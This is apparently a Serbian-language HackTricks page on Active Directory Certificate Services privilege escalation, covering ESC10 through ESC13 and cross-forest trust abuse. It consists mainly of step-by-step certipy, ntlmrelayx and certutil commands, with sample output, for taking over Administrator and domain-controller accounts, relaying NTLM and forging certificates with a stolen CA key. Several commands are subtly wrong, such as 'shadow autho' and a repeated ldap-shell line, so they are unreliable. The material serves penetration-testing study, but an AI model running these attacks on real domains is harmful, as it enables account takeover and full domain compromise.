Ako `CertificateMappingMethods` uključuje `UPN` bit (`0x4`).

### Slučaj Zloupotrebe 1

Sa `StrongCertificateBindingEnforcement` konfigurisanom kao `0`, nalog A sa `GenericWrite` dozvolama može biti iskorišćen da kompromituje bilo koji nalog B.

Na primer, imajući `GenericWrite` dozvole nad `Jane@corp.local`, napadač ima za cilj da kompromituje `Administrator@corp.local`. Procedura odražava ESC9, omogućavajući korišćenje bilo kog šablona sertifikata.

U početku, `Jane`-in hash se preuzima koristeći Shadow Credentials, iskorišćavajući `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Nakon toga, `Jane`'s `userPrincipalName` se menja u `Administrator`, namerno se izostavlja deo `@corp.local` kako bi se izbegla povreda ograničenja.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Nakon toga, traži se sertifikat koji omogućava autentifikaciju klijenta kao `Jane`, koristeći podrazumevani `User` šablon.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` se zatim vraća na prvobitni, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Autentifikacija sa dobijenom sertifikatom će dati NT hash `Administrator@corp.local`, što zahteva navođenje domena u komandi zbog odsustva informacija o domenu u sertifikatu.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

Sa `CertificateMappingMethods` koji sadrži `UPN` bit flag (`0x4`), nalog A sa `GenericWrite` dozvolama može da kompromituje bilo koji nalog B koji nema `userPrincipalName` svojstvo, uključujući naloge mašina i ugrađenog domen administratora `Administrator`.

Ovde je cilj kompromitovati `DC$@corp.local`, počinjući sa dobijanjem `Jane`-inog hash-a putem Shadow Credentials, koristeći `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'s `userPrincipalName` se zatim postavlja na `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Zahteva se sertifikat za autentifikaciju klijenta kao `Jane` koristeći podrazumevani `User` šablon.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` se vraća na prvobitno nakon ovog procesa.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Da bi se autentifikovao putem Schannel-a, koristi se Certipy-ova `-ldap-shell` opcija, koja označava uspešnu autentifikaciju kao `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Kroz LDAP shell, komande kao što su `set_rbcd` omogućavaju napade zasnovane na resursima sa ograničenom delegacijom (RBCD), što može ugroziti kontroler domena.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ova ranjivost se takođe odnosi na bilo koji korisnički nalog koji nema `userPrincipalName` ili gde se ne poklapa sa `sAMAccountName`, pri čemu je podrazumevani `Administrator@corp.local` primarna meta zbog svojih povišenih LDAP privilegija i odsustva `userPrincipalName` po defaultu.

## Relaying NTLM to ICPR - ESC11

### Objašnjenje

Ako CA Server nije konfigurisan sa `IF_ENFORCEENCRYPTICERTREQUEST`, može se izvršiti NTLM relaying napad bez potpisivanja putem RPC servisa. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Možete koristiti `certipy` da enumerišete da li je `Enforce Encryption for Requests` onemogućen i certipy će prikazati `ESC11` ranjivosti.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

Potrebno je postaviti relani server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Napomena: Za kontrolere domena, moramo navesti `-template` u DomainController.

Ili koristeći [sploutchy's fork of impacket](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell pristup ADCS CA sa YubiHSM - ESC12

### Objašnjenje

Administratori mogu postaviti Sertifikacionu Autoritetu da je čuva na spoljnjem uređaju kao što je "Yubico YubiHSM2".

Ako je USB uređaj povezan sa CA serverom putem USB porta, ili USB uređaj server u slučaju da je CA server virtuelna mašina, potrebna je autentifikaciona ključ (ponekad nazvan "lozinka") za Key Storage Provider da generiše i koristi ključeve u YubiHSM.

Ovaj ključ/lozinka se čuva u registru pod `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` u čistom tekstu.

Reference u [ovde](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Scenarijo zloupotrebe

Ako je privatni ključ CA sačuvan na fizičkom USB uređaju kada ste dobili shell pristup, moguće je povratiti ključ.

Prvo, potrebno je da dobijete CA sertifikat (ovo je javno) i zatim:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Na kraju, koristite certutil `-sign` komandu da falsifikujete novu proizvoljnu sertifikat koristeći CA sertifikat i njegov privatni ključ.

## OID Grupa Link Zloupotreba - ESC13

### Objašnjenje

Atribut `msPKI-Certificate-Policy` omogućava dodavanje politike izdavanja u šablon sertifikata. `msPKI-Enterprise-Oid` objekti koji su odgovorni za izdavanje politika mogu se otkriti u Konfiguracionom Imenovanju Konteksta (CN=OID,CN=Public Key Services,CN=Services) PKI OID kontejnera. Politika se može povezati sa AD grupom koristeći atribut `msDS-OIDToGroupLink` ovog objekta, omogućavajući sistemu da ovlasti korisnika koji predstavi sertifikat kao da je član grupe. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Drugim rečima, kada korisnik ima dozvolu da registruje sertifikat i sertifikat je povezan sa OID grupom, korisnik može naslediti privilegije ove grupe.

Koristite [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) da pronađete OIDToGroupLink:
```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

Pronađite korisničku dozvolu koju može koristiti `certipy find` ili `Certify.exe find /showAllPermissions`.

Ako `John` ima dozvolu da se upiše u `VulnerableTemplate`, korisnik može naslediti privilegije grupe `VulnerableGroup`.

Sve što treba da uradi je da specificira šablon, dobiće sertifikat sa pravima OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Kompromitovanje šuma sa sertifikatima objašnjeno u pasivnom glasu

### Rušenje poverenja šuma od strane kompromitovanih CA

Konfiguracija za **cross-forest enrollment** je relativno jednostavna. **Root CA sertifikat** iz resursnog šuma je **objavljen u šumama naloga** od strane administratora, a **enterprise CA** sertifikati iz resursnog šuma su **dodati u `NTAuthCertificates` i AIA kontejnere u svakoj šumi naloga**. Da pojasnimo, ovaj aranžman daje **CA u resursnom šumu potpunu kontrolu** nad svim drugim šumama za koje upravlja PKI. Ako bi ovaj CA bio **kompromitovan od strane napadača**, sertifikati za sve korisnike u resursnom i šumama naloga mogli bi biti **falsifikovani od strane njih**, čime bi se prekrila sigurnosna granica šuma.

### Prava za upis dodeljena stranim principima

U multi-forest okruženjima, potrebna je opreznost u vezi sa Enterprise CA koje **objavljuju šablone sertifikata** koji omogućavaju **Authenticated Users ili strane principe** (korisnici/grupe van šuma kojoj Enterprise CA pripada) **prava za upis i uređivanje**.\
Nakon autentifikacije preko poverenja, **Authenticated Users SID** se dodaje korisničkom tokenu od strane AD. Tako, ako domen ima Enterprise CA sa šablonom koji **omogućava prava za upis Authenticated Users**, šablon bi potencijalno mogao biti **upisan od strane korisnika iz druge šume**. Slično, ako su **prava za upis izričito dodeljena stranom principu putem šablona**, **stvara se međusobni odnos kontrole pristupa između šuma**, omogućavajući principu iz jedne šume da **upisuje šablon iz druge šume**.

Oba scenarija dovode do **povećanja površine napada** od jedne šume do druge. Podešavanja šablona sertifikata mogla bi biti iskorišćena od strane napadača da dobiju dodatna prava u stranoj domeni.


{{#include ../../../banners/hacktricks-training.md}}
